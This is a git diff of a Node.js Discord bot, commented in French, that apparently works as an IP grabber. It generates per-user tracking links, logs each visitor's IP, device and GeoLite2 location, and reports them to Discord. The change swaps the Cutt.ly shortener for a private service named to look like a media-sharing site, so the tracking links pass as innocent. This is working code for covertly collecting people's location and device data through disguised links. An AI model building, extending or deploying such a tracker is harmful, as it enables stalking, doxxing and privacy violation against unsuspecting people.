@@ -25,7 +25,7 @@ app.use(cors());
 const port = process.env.PORT || 3000;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const TRACKER_BASE_URL = process.env.TRACKER_BASE_URL;
-const CUTTLY_API_KEY = process.env.CUTTLY_API_KEY;
+const SHORTLINK_BASE_URL = 'https://instantmedia-share.onrender.com';
 const BDC_TOKEN = process.env.BDC_TOKEN;
 const CLIENTS_FILE = './clients.json';
 const deviceDetector = new DeviceDetector();
@@ -36,31 +36,17 @@ const maxmind = require('maxmind');
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
 
-// Fonction de raccourcissement Cutt.ly avec tentatives infinies limitées à 20
-async function shortenWithCuttly(longUrl, baseSuffix) {
-  let attempt = 0;
-  while (attempt < 20) {
-    const suffix = attempt === 0 ? baseSuffix : `${baseSuffix}-${attempt}`;
-    try {
-      const response = await axios.get('https://cutt.ly/api/api.php', {
-        params: {
-          key: CUTTLY_API_KEY,
-          short: longUrl,
-          name: suffix
-        }
-      });
-
-      const data = response.data;
-      if (data.url.status === 7) {
-        return data.url.shortLink;
-      }
-    } catch (err) {
-      console.error(`Erreur Cutt.ly (essai ${attempt}) :`, err.response?.data || err.message);
-    }
-    attempt++;
+// Fonction pour raccourcir un lien avec ton shortlink personnel
+async function shortenWithInstantMediaShare(longUrl) {
+  try {
+    const response = await axios.post(`${SHORTLINK_BASE_URL}/shorten`, {
+      url: longUrl
+    });
+    return response.data.shortUrl;
+  } catch (error) {
+    console.error('Erreur Shortlink:', error.response?.data || error.message);
+    return null;
   }
-  console.error("❌ Impossible de raccourcir l'URL après 20 essais.");
-  return null;
 }
 
 // Fonction commune pour envoyer un embed IP
@@ -73,7 +59,7 @@ async function logIp(req, res, redirectUrl = null) {
   const userAgent = req.headers['user-agent'];
   const device = deviceDetector.parse(userAgent);
 
-  // Ignore les bots et Inconnus
+  // Ignore bots et inconnus
   if (!device.client?.name && !device.os?.name) {
     console.log(`⛔ Ignoré - Appareil inconnu pour IP ${ip}`);
     if (redirectUrl) {
@@ -237,10 +223,9 @@ client.on(Events.InteractionCreate, async interaction => {
     const uniqueId = `${user.id}_${shortId}`;
     const baseUrl = process.env.TRACKER_BASE_URL.replace(/\/$/, '');
 
-    let generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
+    const generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
 
-    const suffix = selection.replace(/\./g, '-');
-    const shortLink = await shortenWithCuttly(generatedUrl, suffix) || generatedUrl;
+    const shortLink = await shortenWithInstantMediaShare(generatedUrl) || generatedUrl;
 
     await channel.send(`✅ Ton lien est prêt :\n${shortLink}`);
 
